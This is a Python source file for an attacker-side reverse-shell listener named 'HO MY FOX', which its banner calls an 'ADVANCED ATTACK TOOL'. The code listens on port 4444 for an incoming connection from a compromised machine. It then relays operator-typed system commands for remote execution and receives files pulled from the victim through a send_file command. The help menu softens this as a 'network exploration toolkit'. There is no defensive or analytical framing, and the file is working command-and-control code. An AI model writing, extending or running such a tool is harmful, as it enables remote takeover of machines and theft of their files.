import socket


class HoMyFoxServer:
    def __init__(self, host='0.0.0.0', port=4444):
        self.HOST = host
        self.PORT = port
        self.server = None
        self.client = None

    def display_ascii_art(self):
        fox_art = r"""
   ██████╗  ██████╗      ███╗   ███╗██╗   ██╗    ███████╗ ██████╗ ██╗  ██╗
  ██╔═══██╗██╔═══██╗     ████╗ ████║╚██╗ ██╔╝    ██╔════╝██╔═══██╗╚██╗██╔╝
  ██║   ██║██║   ██║     ██╔████╔██║ ╚████╔╝     █████╗  ██║   ██║ ╚███╔╝ 
  ██║   ██║██║   ██║     ██║╚██╔╝██║  ╚██╔╝      ██╔══╝  ██║   ██║ ██╔██╗ 
  ╚██████╔╝╚██████╔╝     ██║ ╚═╝ ██║   ██║       ██║     ╚██████╔╝██╔╝ ██╗
   ╚═════╝  ╚═════╝      ╚═╝     ╚═╝   ╚═╝       ╚═╝      ╚═════╝ ╚═╝  ╚═╝
                   HEHE 🦊 ADVANCED ATTACK  TOOL BY FOX 🌐
        """
        print(fox_art)

    def start(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.HOST, self.PORT))
        self.server.listen(1)

        self.display_ascii_art()
        print(f"[+] Listening on {self.HOST}:{self.PORT}...")

        self.client, addr = self.server.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")

        while True:
            try:
                command = input("HO MY FOX > ")

                if command.lower() == "exit":
                    self.client.send(b"exit")
                    print("[*] Closing connection.")
                    break

                elif command.lower() == "help":
                    print("🦊 HO MY FOX - NETWORK EXPLORATION TOOLKIT 🌐")
                    print("AVAILABLE COMMANDS:")
                    print(" - exit: Close connection")
                    print(" - help: Show this help")
                    print(" - sysinfo: Get detailed system information")
                    print(" - send_file <filename>: Securely send a file")
                    print(" - joke: Get a random hacker joke")
                    print(" - [system command]: Execute system command")

                elif command.startswith("send_file"):
                    _, file_name = command.split(" ", 1)
                    self.client.send(command.encode())
                    response = self.receive_file(file_name)
                    if response:
                        print(f"[✅] File transfer completed: {response}")

                else:
                    self.client.send(command.encode())
                    response = self.client.recv(4096).decode()
                    print(response)

            except Exception as e:
                print(f"[-] Error: {e}")
                break

        self.client.close()
        self.server.close()

    def receive_file(self, file_name):
        try:
            original_filename = file_name
            transfer_info = self.client.recv(1024).decode().split()

            if transfer_info[0] == "FILE_TRANSFER":
                filename = transfer_info[1]
                file_hash = transfer_info[2]

                with open(filename, 'wb') as f:
                    while True:
                        data = self.client.recv(4096)
                        if data.endswith(b"EOF"):
                            f.write(data[:-3])
                            break
                        f.write(data)

                return f"File {filename} received (Hash: {file_hash})"
        except Exception as e:
            print(f"[-] File receive error: {e}")

        return None


def main():
    server = HoMyFoxServer()
    server.start()


if __name__ == "__main__":
    main()